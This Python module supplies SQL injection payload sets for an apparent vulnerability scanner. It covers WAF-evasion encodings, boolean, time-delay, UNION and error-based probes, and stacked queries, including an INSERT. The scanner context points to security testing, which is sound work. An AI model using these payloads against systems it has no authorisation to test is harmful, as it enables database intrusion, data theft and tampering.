"""Payload-assembly and mutation strategies for the SQLi detector.

Mixin for SQLiDetector: WAF polymorphic encodings and context-aware
per-parameter payload suites. Pure payload content - no HTTP, no oracles.
"""

from __future__ import annotations


class PayloadMixin:


    def _build_waf_polymorphic_set(self) -> list[str]:
        """
        Generate encoding-diversified variants that bypass rule-based WAFs:
          • MySQL versioned comments  /*!50000SELECT*/
          • Whitespace substitutes   %09 %0a %0c %0d %a0
          • String-concat avoidance  CONCAT(CHAR(…)) bypasses quote filters
          • HTTP Parameter Pollution id=1&id=' OR 1=1-- (for proxy-WAF bypass)
        """
        payloads: list[str] = []

        # MySQL versioned inline comments
        payloads.extend(
            [
                "'/*!50000OR*//*!50000 1*/=1--",
                "'/*!50000UNION*//*!50000SELECT*/NULL--",
                "' /*!50000AND*/ SLEEP(3)--",
            ]
        )

        # Whitespace substitution (hex-encoded in URL context — many WAFs only
        # strip ASCII 0x20; tab 0x09 and newline 0x0a are invisible to simple regex)
        for ws in ["\t", "\n", "\r", "\x0c"]:
            payloads.append(f"'{ws}OR{ws}1=1--")
            payloads.append(f"'{ws}AND{ws}SLEEP(3)--")

        # Quote-less payloads via CHAR() — bypasses addslashes() quote filters
        # CHAR(39) = ' (single quote)  CHAR(49,61,49) = '1=1'
        payloads.extend(
            [
                "' OR CHAR(49)=CHAR(49)--",
                "' AND 1=CHAR(49)--",
                "' UNION SELECT CONCAT(CHAR(115,113,108,105),version())--",
            ]
        )

        # Double-encode critical characters for WAFs that only decode once
        payloads.extend(
            [
                "%27%20OR%201%3D1--",  # ' OR 1=1--
                "%27%20AND%201%3D2--",  # ' AND 1=2--
            ]
        )

        return payloads


    def _build_param_payload_suite(self, param_name: str, param_val: str, generic_payloads: list[str]) -> list[str]:
        suite = list(generic_payloads)

        # Integer context: unquoted arithmetic + delay probes
        if param_val.isdigit():
            suite[0:0] = [
                f"{param_val} AND 1=1",
                f"{param_val} AND 1=2",
                f"{param_val}-0",
                f"{param_val} AND SLEEP(3)",
                f"{param_val} AND pg_sleep(3)",
                f"{param_val}; WAITFOR DELAY '0:0:3'--",
            ]

        # Quoted string contexts: single, double, nested parentheses
        suite.extend(
            [
                "' OR '1'='1",
                "' AND '1'='2",
                '" OR "1"="1',
                '" AND "1"="2',
                "') OR ('1'='1",
                "') AND ('1'='2",
                "')) OR (('1'='1",
                "')) AND (('1'='2",
                "') OR 1=1--",
                "')) OR 1=1--",
            ]
        )

        # ORDER BY column stepper (1–10; binary search done in Engine 4)
        for n in [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]:
            suite.append(f"' ORDER BY {n}--")
            suite.append(f"1 ORDER BY {n}--")

        # UNION NULL probes up to 8 columns (wider starter; bisector goes deeper)
        for n in range(1, 9):
            suite.append("' UNION SELECT " + ",".join(["NULL"] * n) + "--")

        # Error-based probes
        suite.extend(
            [
                "' AND 1=CAST((SELECT version()) AS int)--",
                "' AND 1=CONVERT(int, (SELECT @@version))--",
                "' AND extractvalue(1, concat(0x7e,(SELECT version()),0x7e))--",
                "' AND updatexml(1,concat(0x7e,(SELECT version()),0x7e),1)--",
                # Stacked queries (MySQL, MSSQL, PostgreSQL where allowed)
                "'; SELECT 1--",
                "'; INSERT INTO x VALUES(1)--",
            ]
        )

        return list(dict.fromkeys(suite))
